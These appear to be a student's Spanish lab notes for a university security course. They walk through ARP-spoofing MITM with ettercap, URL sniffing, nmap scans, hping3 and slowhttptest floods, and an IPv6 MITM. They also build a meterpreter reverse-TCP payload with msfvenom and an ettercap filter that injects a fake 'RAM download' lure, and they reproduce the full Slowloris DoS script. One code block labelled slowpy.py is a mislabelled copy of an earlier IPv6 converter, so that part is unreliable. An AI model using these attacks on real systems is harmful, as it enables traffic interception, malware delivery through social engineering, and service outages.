[[Lexislación e Seguridade Informática]]

### a) Instale el ettercap y pruebe sus opciones básicas en línea de comando.
+ apt install ettercap-text-only

### b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados):
+ ettercap -T -q -i ens33 -M arp:remote /10.11.49.49// /10.11.48.1//

En otra shell:
+ tcpdump -i ens33 -s 65535 -w file.pcap

En cmd:
+ scp lsi@10.11.49.56:/home/lsi/file.pcap .

##### Identifique los campos de cabecera de un paquete TCP.
En wireshark:
1. Filtrar por tcp
2. Seleccionar un paquete
3. Pulsar en transmission control protocol

##### Filtre la captura para obtener el tráfico HTTP.
En wireshark:
1. Filtrar por http

##### Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.).
En wireshark:
1. Filtrar por http
2. Seleccionar un paquete
3. Archivo->Exportar objetos->http

##### Visualice la paquetería TCP de una determinada sesión. 
En wireshark:
1. Filtrar por tcp
2. Seleccionar un paquete
3. Analizar->Seguir->Secuencia TCP

##### Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico. 
En wireshark:
1. Estadísticas->Jerarquía de protocolo

##### Obtenga información del tráfico de las distintas “conversaciones” mantenidas. 
En wireshark:
1. Estadísticas->Conversaciones

##### Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.
En wireshark:
1. Estadísticas->Puntos finales

### c) Obtenga la relación de las direcciones MAC de los equipos de su segmento
+ nmap -sP 10.11.48.0/23
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-07 22:58 CET
Nmap scan report for 10.11.48.1
Host is up (0.00075s latency).
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Nmap scan report for 10.11.48.16
Host is up (0.00083s latency).
MAC Address: 00:50:56:97:AD:61 (VMware)
Nmap scan report for 10.11.48.17
Host is up (0.00065s latency).
MAC Address: 00:50:56:97:B7:FC (VMware)
Nmap scan report for 10.11.48.18
Host is up (0.0019s latency).
MAC Address: 00:50:56:97:9D:5C (VMware)
Nmap scan report for 10.11.48.19
Host is up (0.00072s latency).
MAC Address: 00:50:56:97:6D:B6 (VMware)
...
```

+ arp-scan -I ens33 10.11.48.0/23
```
Interface: ens33, type: EN10MB, MAC: 00:50:56:97:1f:22, IPv4: 10.11.49.56
Starting arp-scan 1.10.0 with 512 hosts (https://github.com/royhills/arp-scan)
10.11.48.1      dc:08:56:10:84:b9       Alcatel-Lucent Enterprise
10.11.48.16     00:50:56:97:ad:61       VMware, Inc.
10.11.48.17     00:50:56:97:b7:fc       VMware, Inc.
10.11.48.18     00:50:56:97:9d:5c       VMware, Inc.
10.11.48.19     00:50:56:97:6d:b6       VMware, Inc.
10.11.48.20     00:50:56:97:27:11       VMware, Inc.
10.11.48.21     00:50:56:97:e5:19       VMware, Inc.
10.11.48.22     00:50:56:97:2d:ad       VMware, Inc.
...
```

### d) Obtenga la relación de las direcciones IPv6 de su segmento.
+  nmap -sP -oG ipv4.txt 10.11.48.0/23
+ cat ipv4.txt
```
# Nmap 7.93 scan initiated Thu Dec 14 23:10:34 2023 as: nmap -sP -oG ipv4.txt 10.11.48.0/23
Host: 10.11.48.1 ()     Status: Up
Host: 10.11.48.16 ()    Status: Up
Host: 10.11.48.17 ()    Status: Up
Host: 10.11.48.18 ()    Status: Up
Host: 10.11.48.19 ()    Status: Up
...
```

Crear script que convierte las ipv4 en ipv6:
+ cat ipv6.py
```
import re

def ipv4_to_ipv6(ipv4_address):
    # Split the IPv4 address into octets
    octets = ipv4_address.split('.')

    # Convert each octet to hexadecimal and format it for IPv6
    ipv6_segments = [format(int(octet), 'x').zfill(2) for octet in octets]

    # Insert colons between segments and add IPv6 prefix
    ipv6_address = '2002:{}:{}::1'.format(ipv6_segments[0] + ipv6_segments[1], ipv6_segments[2] + ipv6_segments[3])

    return ipv6_address

def convert_ipv4_to_ipv6(file_path):
    with open(file_path, 'r') as file:
        # Read the content of the file
        content = file.read()

        # Use regex to extract IPv4 addresses
        ipv4_addresses = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', content)

        # Convert each IPv4 address to IPv6
        ipv6_addresses = [ipv4_to_ipv6(ipv4) for ipv4 in ipv4_addresses]

        return ipv6_addresses

if __name__ == "__main__":
    # Replace 'ipv4.txt' with the actual path to your file
    file_path = 'ipv4.txt'

    # Get the IPv6 addresses
    ipv6_addresses = convert_ipv4_to_ipv6(file_path)

    # Print the results
    print("IPv6 Addresses:")
    for ipv6 in ipv6_addresses:
        print(ipv6)

```

+ python3 ipv6.py
```
IPv6 Addresses:
2002:0a0b:3000::1
2002:0a0b:3001::1
2002:0a0b:3010::1
2002:0a0b:3011::1
2002:0a0b:3012::1
2002:0a0b:3013::1
2002:0a0b:3014::1
2002:0a0b:3015::1
...
```

### e) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.
+ tcpdump -i ens33 -s 65535 -w mytraffic.pcap

En cmd:
+ scp lsi@10.11.49.56:/home/lsi/mytraffic.pcap .

### f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.
+ apt install dsniff
En /etc/ettercap/etter dar permisos root a ettercap:
```
[privs]
ec_uid = 0                # nobody is the default
ec_gid = 0                # nobody is the default
```

+ ettercap -i ens33 -P remote_browser -Tq  -M arp:remote /10.11.49.49// /10.11.48.1//

En otra shell:
+ urlsnarf -i ens33

En shell víctima:
+ lynx http://edu4java.com

### g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.
+ msfconsole

En metaexploit:
+ msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.49.56 lport=2003 -f elf -o ivan.exe
+ mv ivan.exe /var/www/html

En shell:
+ nano filtro.filter
```
if (ip.proto == TCP && tcp.dst == 80) {
 if (search(DATA.data, "Accept-Encoding")) {
 replace("Accept-Encoding", "Accept-Nothing!");
 }
}

if (ip.proto == TCP && tcp.src == 80) {
 if (search(DATA.data, "<title>")) {
 replace("</title>", "</title><h1> ALERTA!!!!!!!!! su dispositivo se está quedando sin memoria RAM</h1><h2>Pulse aquí para descargar 8 GB de RAM lógica y ejecute el archivo</h2><form method="get" action="http://10.11.49.56/ivan.exe"><button type="submit"> DOWNLOAD"</button></form>");
 msg("html injected");
 }
}
```

+ etterfilter filtro.filter -o filtro.ef
+  ettercap -Tq -i ens33 -F filtro.ef -M arp:remote /10.11.49.49// /10.11.48.1//

En metaexploit:
+ use  exploit/multi/handler
+ set payload linux/x64/meterpreter_reverse_tcp
+  set lhost 10.11.48.56
+ set lport 2003
+ exploit

En shell víctima:
+ lynx www.udc.es (descargar el archivo)
+ chmod u+x ivan.exe
+ ./ivan.exe
### h) Haga un MITM en IPv6 y visualice la paquetería.
+  ettercap  -6 -T -q -i ens33 -M arp:remote //2002:0a0b:3131::/ //::10.11.48.1/
+ ettercap -i ens33 -Tq -M ndp:remote /10.11.49.49/2002:0a0b:3131::// /10.11.48.1//

En otra shell:
+ tcpdump -i ens33 -s 65535 -w ipv6file.pcap

En shell víctima:
+ curl http://[2002:0a0b:3138::]/index.html

### i) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).
En /etc/arcpon.conf añadir:
```
#Router
10.11.48.1      dc:08:56:10:84:b9

#Ivanna
10.11.49.49     00:50:56:97:e5:b1
```

En shell defensora:
+ arp -a | grep "(10.11.48.1)" 

En shell atacante:
+ ettercap -i ens33 -TqM arp:remote //10.11.49.56/ //10.11.48.1/

En shell defensora:
+ arp -a | grep "(10.11.48.1)"  # Cambia la MAC del router
+ systemctl start arpon
+ arpon -d -i ens33 -S

En shell atacante:
+ ettercap -i ens33 -TqM arp:remote //10.11.49.56/ //10.11.48.1/

En shell defensora:
+ arp -a | grep "(10.11.48.1)"   # No cambia la MAC del router
+ systemctl stop arpon && systemctl disable arpon && systemctl mask arpon

### j) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?
##### Host discovery
+ nmap -sL 10.11.48.0/23  # Hosts activos
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 20:46 CET
Nmap scan report for 10.11.48.0
Nmap scan report for 10.11.48.1
Nmap scan report for 10.11.48.2
Nmap scan report for 10.11.48.3
Nmap scan report for 10.11.48.4
Nmap scan report for 10.11.48.5
Nmap scan report for 10.11.48.6
Nmap scan report for 10.11.48.7
Nmap scan report for 10.11.48.8
Nmap scan report for 10.11.48.9
```

+ nmap -sP 10.11.48.0/23  # Hosts activos y MACs
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 20:46 CET
Nmap scan report for 10.11.48.1
Host is up (0.00069s latency).
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Nmap scan report for 10.11.48.16
Host is up (0.00048s latency).
MAC Address: 00:50:56:97:AD:61 (VMware)
Nmap scan report for 10.11.48.17
Host is up (0.00064s latency).
MAC Address: 00:50:56:97:B7:FC (VMware)
Nmap scan report for 10.11.48.18
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:9D:5C (VMware)
```

##### Port scanning
+ nmap -sS 10.11.49.56  # Puertos abiertos en una máquina
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 20:45 CET
Nmap scan report for 10.11.49.56
Host is up (0.000011s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
514/tcp  open  shell
3000/tcp open  ppp
9100/tcp open  jetdirect
```

##### Fingerprinting
+  nmap -O 10.11.49.56  # Fingerprinting de sistema operativo
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 20:44 CET
Nmap scan report for 10.11.49.56
Host is up (0.000074s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
514/tcp  open  shell
3000/tcp open  ppp
9100/tcp open  jetdirect
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops
```

### k) Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.
+ nethogs  # Lista de procesos que están utilizando la red, junto con información sobre la cantidad de ancho de banda que están consumiendo en tiempo real.
```
NetHogs version 0.8.7-2

    PID USER     PROGRAM                                                                                                     DEV         SENT      RECEIVED
  39473 lsi      sshd: lsi@pts/0                                                                                             ens33       0.527       0.176 KB/sec
    811 grafana  /usr/share/grafana/bin/grafana                                                                              ens33       0.000       0.000 KB/sec
      ? root     unknown TCP                                                                                                             0.000       0.000 KB/sec
```

+ iftop -l -i ens33  # Información sobre el tráfico de red en esa interfaz específica.

+ vnstat -l -i ens33  # monitorear el uso de ancho de banda y proporciona información detallada sobre el tráfico de red en esa interfaz específica
```
Monitoring ens33...    (press CTRL-C to stop)

   rx:       960 bit/s     2 p/s          tx:       424 bit/s     0 p/s

```

### l) Monitorizamos nuestra infraestructura.
##### Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux. 
Instalar prometheus desde la página oficial.
+ cat prometheus-2.47.2.linux-amd64/prometheus.yml
```
# my global config
global:
  scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.
  evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute.
  # scrape_timeout is set to the global default (10s).

# Alertmanager configuration
alerting:
  alertmanagers:
    - static_configs:
        - targets:
          # - alertmanager:9093

# Load rules once and periodically evaluate them according to the global 'evaluation_interval'.
rule_files:
  # - "first_rules.yml"
  # - "second_rules.yml"

# A scrape configuration containing exactly one endpoint to scrape:
# Here it's Prometheus itself.
scrape_configs:
  # The job name is added as a label `job=<job_name>` to any timeseries scraped from this config.
  - job_name: "prometheus"

    # metrics_path defaults to '/metrics'
    # scheme defaults to 'http'.

    static_configs:
      - targets: ["localhost:9090"]
  - job_name: node
    static_configs:
      - targets: ["localhost:9100"]

```

Instalar node exporter y configurarlo como servicio:
+ cat  cat /etc/systemd/system/node_exporter.service
```
[Unit]
Description=Prometheus Node Exporter
Wants=network-online.target
After=network-online.target

[Service]
User=node_exporter
Group=node_exporter
Type=simple
ExecStart=/usr/local/bin/node_exporter

[Install]
WantedBy=multi-user.target
```

+ systemctl start node_exporter
+ systemctl enable node_exporter 
##### Posteriormente instale grafana y agregue como fuente de datos las métricas de su equipo de prometheus. 
Instalar grafana desde la página oficial.
+ systemctl start grafana_server
+  systemctl enable grafana_server
##### Importe vía grafana el dashboard 1860. 
+ ./prometheus-2.47.2.linux-amd64/prometheus --config.file=prometheus-2.47.2.linux-amd64/prometheus.yml
Entrar a http://10.11.49.56:3000.
Data Sources>Add new data source>Prometheus>Prometheus server URL=http://10.11.49.56:9090>Save and test>Build a dashboard>Import dashboard>1860>Load>Select Prometheus>Import

##### En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas.

### m) PARA PLANTEAR DE FORMA TEÓRICA: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?
**Direct attack:** un atacante intenta sobrecargar un servicio o recurso específico en un sistema objetivo mediante el envío de un gran volumen de tráfico legítimo o no legítimo a dicho servicio. En el caso de un servidor web, un atacante podría enviar una gran cantidad de solicitudes HTTP legítimas o maliciosas al servidor con el fin de agotar sus recursos, como la CPU o la memoria. Por ejemplo:
+ hping3 --rand-source -p 80 -S --flood 10.11.49.49

**Reflecting flooding attack:** en un ataque de inundación reflexiva, un atacante utiliza servidores intermediarios para amplificar su ataque. El atacante envía solicitudes falsificadas a los servidores intermedios, que luego retransmiten solicitudes amplificadas al objetivo real.

### n) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7) ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?
+ slowhttptest -c 1000 -H -g -i 10 -r 200 -t GET -u http://10.11.49.49 -x 24 -p 3
+ slowhttptest -c 1000 -B -g -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.11.49.49 -x 10 -p 3
+ slowhttptest -c 1000 -g -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u  http://10.11.49.49 -p 3
+ python3 slowpy.py 10.11.49.49
```
import re

def ipv4_to_ipv6(ipv4_address):
    # Split the IPv4 address into octets
    octets = ipv4_address.split('.')

    # Convert each octet to hexadecimal and format it for IPv6
    ipv6_segments = [format(int(octet), 'x').zfill(2) for octet in octets]

    # Insert colons between segments and add IPv6 prefix
    ipv6_address = '2002:{}:{}::1'.format(ipv6_segments[0] + ipv6_segments[1], ipv6_segments[2] + ipv6_segments[3])

    return ipv6_address

def convert_ipv4_to_ipv6(file_path):
    with open(file_path, 'r') as file:
        # Read the content of the file
        content = file.read()

        # Use regex to extract IPv4 addresses
        ipv4_addresses = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', content)

        # Convert each IPv4 address to IPv6
        ipv6_addresses = [ipv4_to_ipv6(ipv4) for ipv4 in ipv4_addresses]

        return ipv6_addresses

if __name__ == "__main__":
    # Replace 'ipv4.txt' with the actual path to your file
    file_path = 'ipv4.txt'

    # Get the IPv6 addresses
    ipv6_addresses = convert_ipv4_to_ipv6(file_path)

    # Print the results
    print("IPv6 Addresses:")
    for ipv6 in ipv6_addresses:
```

+ perl slowpl.pl -dns 10.11.49.49
```
#!/usr/bin/perl -w
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;

$SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors

print <<EOTEXT;
CCCCCCCCCCOOCCOOOOO888\@8\@8888OOOOCCOOO888888888\@\@\@\@\@\@\@\@\@8\@8\@\@\@\@888OOCooocccc::::
CCCCCCCCCCCCCCCOO888\@888888OOOCCCOOOO888888888888\@88888\@\@\@\@\@\@\@888\@8OOCCoococc:::
CCCCCCCCCCCCCCOO88\@\@888888OOOOOOOOOO8888888O88888888O8O8OOO8888\@88\@\@8OOCOOOCoc::
CCCCooooooCCCO88\@\@8\@88\@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888\@8888OOOCc::::
CooCoCoooCCCO8\@88\@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
ooooooCoCCC88\@88888\@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88\@888OCoccc
ooooCCOO8O888888888\@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
oCCCCCCO8OOOCCCOO88\@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
oCCCCCOOO88OCooCO88\@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
oCCCCOO88OOCCCCOO8\@\@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
CCCOOOO88OOCCOOO8\@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
CCCOO88888OOCOO8\@\@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
OOOOOO88888OOOO8\@8\@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
OOOOO888\@8\@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
COOO888\@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
coooCCO8\@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
:ccooooCO888OOOO8OOc..:...::. .co8\@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
.:::coocccoO8OOOOOOC:..::....coCO8\@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
....::::ccccoCCOOOOOCc......:oCO8\@8\@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
.......::::::::cCCCCCCoocc:cO888\@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco
 Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client
EOTEXT

my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
    'shost=s'   => \$shost,
    'dns=s'     => \$host,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
    'version'   => \$version,
);

if ($version) {
    print "Version 0.7\n";
    exit;
}

unless ($host) {
    print "Usage:\n\n\tperl $0 -dns [www.example.com] -options\n";
    print "\n\tType 'perldoc $0' for help with options.\n\n";
    exit;
}

unless ($port) {
    $port = 80;
    print "Defaulting to port 80.\n";
}

unless ($tcpto) {
    $tcpto = 5;
    print "Defaulting to a 5 second tcp connection timeout.\n";
}

unless ($test) {
    unless ($timeout) {
        $timeout = 100;
        print "Defaulting to a 100 second re-try timeout.\n";
    }
    unless ($connections) {
        $connections = 1000;
        print "Defaulting to 1000 connections.\n";
    }
}

my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "Multithreading enabled.\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "No multithreading capabilites found!\n";
    print "Slowloris will be slower than normal as a result.\n";
}

my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;

srand() if ($cache);

if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}

if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "This test could take up to $totaltime minutes.\n";

    my $delay   = 0;
    my $working = 0;
    my $sock;

    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "Connection successful, now comes the waiting game...\n";
        }
        else {
            print
"That's odd - I connected but couldn't send the data to $host:$port.\n";
            print "Is something wrong?\nDying.\n";
            exit;
        }
    }
    else {
        print "Uhm... I can't connect to $host:$port.\n";
        print "Is something wrong?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Trying a $times[$i] second delay: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tWorked.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{__WARN__} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
            print "\tFailed after $times[$i] seconds.\n";
        }
    }

    if ( print $sock "Connection: Close\r\n\r\n" ) {
        print "Okay that's enough time. Slowloris closed the socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    else {
        print "Remote server closed socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Since the timeout ended up being so small ($delay seconds) and it generally
takes between 200-500 threads for most servers and assuming any latency at
all...  you might have trouble using Slowloris against this target.  You can
tweak the -timeout flag down to less than 10 seconds but it still may not
build the sockets in time.
EOSUCKS2BU
    }
}
else {
    print
"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";

    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}

sub doconnections {
    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
        print "\t\tBuilding sockets.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{__WARN__} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print "\t\tSending data.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print
"Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
        sleep($timeout);
    }
}

sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
    }
}

__END__

=head1 TITLE

Slowloris

=head1 VERSION

Version 0.7 Beta

=head1 DATE

06/17/2009

=head1 AUTHOR

RSnake <h@ckers.org> with threading from John Kinsella

=head1 ABSTRACT

Slowloris both helps identify the timeout windows of a HTTP server or Proxy server, can bypass httpready protection and ultimately performs a fairly low bandwidth denial of service.  It has the added benefit of allowing the server to come back at any time (once the program is killed), and not spamming the logs excessively.  It also keeps the load nice and low on the target server, so other vital processes don't die unexpectedly, or cause alarm to anyone who is logged into the server for other reasons.

=head1 AFFECTS

Apache 1.x, Apache 2.x, dhttpd, GoAhead WebServer, others...?

=head1 NOT AFFECTED

IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid, others...?

=head1 DESCRIPTION

Slowloris is designed so that a single machine (probably a Linux/UNIX machine since Windows appears to limit how many sockets you can have open at any given time) can easily tie up a typical web server or proxy server by locking up all of it's threads as they patiently wait for more data.  Some servers may have a smaller tolerance for timeouts than others, but Slowloris can compensate for that by customizing the timeouts.  There is an added function to help you get started with finding the right sized timeouts as well.

As a side note, Slowloris does not consume a lot of resources so modern operating systems don't have a need to start shutting down sockets when they come under attack, which actually in turn makes Slowloris better than a typical flooder in certain circumstances.  Think of Slowloris as the HTTP equivalent of a SYN flood.

=head2 Testing

If the timeouts are completely unknown, Slowloris comes with a mode to help you get started in your testing:

=head3 Testing Example:

./slowloris.pl -dns www.example.com -port 80 -test

This won't give you a perfect number, but it should give you a pretty good guess as to where to shoot for.  If you really must know the exact number, you may want to mess with the @times array (although I wouldn't suggest that unless you know what you're doing).

=head2 HTTP DoS

Once you find a timeout window, you can tune Slowloris to use certain timeout windows.  For instance, if you know that the server has a timeout of 3000 seconds, but the the connection is fairly latent you may want to make the timeout window 2000 seconds and increase the TCP timeout to 5 seconds.  The following example uses 500 sockets.  Most average Apache servers, for instance, tend to fall down between 400-600 sockets with a default configuration.  Some are less than 300.  The smaller the timeout the faster you will consume all the available resources as other sockets that are in use become available - this would be solved by threading, but that's for a future revision.  The closer you can get to the exact number of sockets, the better, because that will reduce the amount of tries (and associated bandwidth) that Slowloris will make to be successful.  Slowloris has no way to identify if it's successful or not though.

=head3 HTTP DoS Example:

./slowloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5

=head2 HTTPReady Bypass

HTTPReady only follows certain rules so with a switch Slowloris can bypass HTTPReady by sending the attack as a POST verses a GET or HEAD request with the -httpready switch.

=head3 HTTPReady Bypass Example

./slowloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5 -httpready

=head2 Stealth Host DoS

If you know the server has multiple webservers running on it in virtual hosts, you can send the attack to a seperate virtual host using the -shost variable.  This way the logs that are created will go to a different virtual host log file, but only if they are kept separately.

=head3 Stealth Host DoS Example:

./slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com

=head2 HTTPS DoS

Slowloris does support SSL/TLS on an experimental basis with the -https switch.  The usefulness of this particular option has not been thoroughly tested, and in fact has not proved to be particularly effective in the very few tests I performed during the early phases of development.  Your mileage may vary.

=head3 HTTPS DoS Example:

./slowloris.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https

=head2 HTTP Cache

